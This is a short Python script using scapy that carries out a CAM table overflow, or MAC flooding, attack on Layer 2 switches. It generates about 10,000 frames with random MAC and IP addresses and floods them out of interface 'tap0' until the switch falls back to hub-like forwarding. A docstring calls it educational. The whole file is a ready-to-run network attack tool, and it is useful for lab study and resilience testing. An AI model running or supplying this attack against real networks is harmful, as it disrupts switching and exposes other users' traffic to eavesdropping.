#!/usr/bin/env python3
"""
CAM Overflow Attack Script

This script performs a CAM table overflow attack on Layer 2 switches. It works by flooding the
switch's CAM table with a large number of packets containing fake MAC addresses. When the CAM table
overflows, the switch is forced to operate in hub mode, which can be useful for testing network
resilience or security measures.

DISCLAIMER:
    This script is for educational purposes only. Unauthorized use on networks you do not own or
    have explicit permission to test is illegal and unethical.

Author: Bharath (github.com/yamakira)
"""

from scapy.all import Ether, IP, RandIP, RandMAC, sendp

def generate_packets():
    """
    Generate a list of random Ethernet/IP packets for a CAM table overflow attack.

    The function creates 10,000 packets. Each packet includes:
        - An Ethernet layer with random source and destination MAC addresses.
        - An IP layer with random source and destination IP addresses.
    
    These packets are intended to rapidly flood the target switch's CAM table.

    Returns:
        list: A list containing the generated packets.
    """
    packet_list = []  # Initialize a list to hold all the packets.
    
    # Create 10,000 packets using random MAC and IP addresses.
    for i in range(1, 10000):
        # Construct an Ethernet/IP packet with random addresses.
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        packet_list.append(packet)
    
    return packet_list

def cam_overflow(packet_list):
    """
    Execute the CAM table overflow attack by sending the generated packets.

    This function sends the entire packet list on a specified network interface (here 'tap0').
    This flooding of packets aims to overwhelm the switch's CAM table, causing it to fail and
    operate as a hub instead.

    Parameters:
        packet_list (list): The list of pre-generated packets to be sent.
    """
    # For faster packet sending, consider using sendpfast with an appropriate rate:
    # sendpfast(packet_list, iface='tap0', mbps=<desired_mbps>)
    # Here we use sendp to send the packets on interface 'tap0'.
    sendp(packet_list, iface='tap0')

if __name__ == '__main__':
    # Generate the list of packets to be used for the attack.
    packet_list = generate_packets()
    
    # Execute the CAM table overflow attack by sending the generated packets.
    cam_overflow(packet_list)
